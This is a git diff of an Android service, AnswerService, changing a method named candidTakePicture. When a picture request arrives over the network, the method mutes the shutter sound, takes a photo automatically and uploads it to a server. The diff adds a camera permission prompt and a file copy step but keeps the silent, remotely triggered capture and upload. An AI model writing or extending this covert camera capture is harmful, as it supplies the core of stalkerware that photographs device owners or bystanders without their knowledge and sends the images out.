@@ -1,9 +1,11 @@
 package com.sun.service;
 
+import android.Manifest;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.hardware.camera2.CameraCaptureSession;
 import android.net.Uri;
 import android.os.Binder;
 import android.os.IBinder;
@@ -13,15 +15,16 @@ import android.util.Log;
 import android.util.Size;
 import android.widget.Toast;
 
-import com.sun.camera.CameraActivity;
+import com.sun.camera.Camera2Basic;
 import com.sun.camera.CameraBasic;
 import com.sun.camera.PictureRequest;
-import com.sun.common.SessionNote;
 import com.sun.connect.EventNetwork;
 import com.sun.connect.NetworkChannel;
 import com.sun.connect.RequestJson;
 import com.sun.conversation.CvsNote;
 import com.sun.device.AskNote;
+import com.sun.personalconnect.BaseActivity;
+import com.sun.personalconnect.Permission;
 import com.sun.utils.FileUtils;
 import com.sun.utils.NoteHelper;
 import com.sun.gps.GpsListener;
@@ -90,7 +93,7 @@ public class AnswerService extends Service implements NetworkChannel.INetworkLis
 //            Intent intent = new Intent(this, CameraActivity.class);
 //            intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
 //            startActivity(intent);
-            candidTakePicture((PictureRequest)obj);
+            candidTakePicture((PictureRequest) obj);
         }
     }
 
@@ -166,33 +169,55 @@ public class AnswerService extends Service implements NetworkChannel.INetworkLis
     private CameraBasic.Callback mCameraBasicCallback;
 
     private void candidTakePicture(final PictureRequest request){
-        CameraBasic cameraBasic = new CameraBasic(this);
-        cameraBasic.muteShutterSound(true);
-        if(mCameraBasicCallback == null){
-            mCameraBasicCallback = new CameraBasic.Callback() {
+        BaseActivity activity = BaseActivity.getAnyInstance();
+        if(activity != null) {
+            activity.requestPermission(new Permission(Manifest.permission.CAMERA, new Permission.Runnable() {
                 @Override
-                public void onPreviewSize(Size size) {
-                }
+                public void run(Permission permission) {
+                    if (permission.isSuccess()) {
+                        CameraBasic cameraBasic = new CameraBasic(AnswerService.this);
+                        cameraBasic.muteShutterSound(true);
+                        if (mCameraBasicCallback == null) {
+                            mCameraBasicCallback = new CameraBasic.Callback() {
+                                @Override
+                                public void onPreviewSize(Size size) {
+                                }
 
-                @Override
-                public void onConfigured() {
-                }
+                                @Override
+                                public void onConfigured() {
 
-                @Override
-                public void onCaptureCompleted(File file) {
-                    ToastUtils.show("onCaptureCompleted file:" + file.getAbsolutePath(), Toast.LENGTH_SHORT);
-                    if(!file.exists()) return;
-                    mNetworkChannel.upload(file);
-                    CvsNote note = NoteHelper.makeImageCvsNote(file);
-                    note.setSession(request);
-                    RequestJson json = FormatUtils.makeRequest(null,note);
-                    mNetworkChannel.request(json);
+                                }
+
+                                @Override
+                                public void onCaptureCompleted(File file) {
+                                    ToastUtils.show("onCaptureCompleted file:" + file.getAbsolutePath(), Toast.LENGTH_SHORT);
+                                    if (!file.exists()) return;
+
+                                    File newFile = new File(Application.App.getSocketRawFolder(), Utils.makeSoleName());
+                                    if (newFile.exists()) newFile.delete();
+                                    try {
+                                        FileUtils.copyFile(file, newFile);
+                                        Log.d(TAG, "copyFile:" + newFile.getAbsolutePath());
+                                    } catch (IOException e) {
+                                        e.printStackTrace();
+                                    }
+
+                                    mNetworkChannel.upload(newFile);
+                                    CvsNote note = NoteHelper.makeImageCvsNote(newFile);
+                                    note.setSession(request);
+                                    RequestJson json = FormatUtils.makeRequest(null, note);
+                                    mNetworkChannel.request(json);
+                                }
+                            };
+                        }
+                        cameraBasic.setFacing(request.facing);
+                        cameraBasic.setAutoTakePicture(1);
+                        cameraBasic.setCaptureCallback(mCameraBasicCallback);
+                        cameraBasic.setAutoClose(true);
+                        cameraBasic.setDisplay();
+                    }
                 }
-            };
+            }));
         }
-        cameraBasic.setAutoTakePicture(1);
-        cameraBasic.setCaptureCallback(mCameraBasicCallback);
-        cameraBasic.setAutoClose(true);
-        cameraBasic.setDisplay();
     }
 }
